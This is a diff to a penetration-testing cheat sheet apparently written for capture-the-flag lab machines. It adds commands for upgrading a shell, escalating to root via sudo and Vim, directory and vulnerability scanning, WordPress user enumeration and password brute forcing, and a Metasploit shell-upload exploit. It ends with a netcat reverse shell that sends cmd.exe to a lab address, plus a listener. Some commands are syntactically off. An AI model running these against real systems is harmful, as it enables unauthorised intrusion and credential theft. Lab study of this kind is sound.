@@ -34,7 +34,13 @@ find / -type f -group bugtracker 2>/dev/null
 3. Find file
 
 ```bash
+# linux
 find / -name "user.txt"
+```
+
+```powershell
+# powershell
+Get-ChildItem  -Recurse –Filter user.txt
 ```
 
 <!-- more -->
@@ -58,6 +64,7 @@ get filename
 
 ```bash
 SHELL=/bin/bash script -q /dev/null
+# or
 python3 -c "import pty;pty.spawn('/bin/bash')"
 ```
 
@@ -71,4 +78,51 @@ sudo -l
 
 When a command can be executed with sudo , we can use this command to open a new bash shell to get root privilege .
 
-For example,  `! /bim/bash` in Vim.
+For example,  `! /bin/bash` in Vim.
+
+### 6. Website
+
+Search for subdirectory
+
+```bash
+gobuster dir -u http://10.10.10.29 -w /usr/share/wordlists/dirb/big.txt
+```
+
+Analyze
+
+```bash
+nikto -host http://10.10.10.28 -o _28.html
+```
+
+#### WordPress
+
+Enumerate accounts and Brute Force the password
+
+```bash
+wpscan --url http://10.10.10.29/wordpress --enumerate
+```
+
+```bash
+wpscan --url http://10.10.10.29/wordpress -U users.txt -P backupPasswords
+```
+
+use metasploit
+
+```bash
+use exploit/unix/webapp/wp_admin_shell_upload
+```
+
+### NetCat
+
+Reverse:
+
+```bash
+nc.exe -a "-e cmd.exe 10.10.16.4 7777"
+```
+
+Listen:
+
+```zsh
+nc -lvpn 4444
+```
+
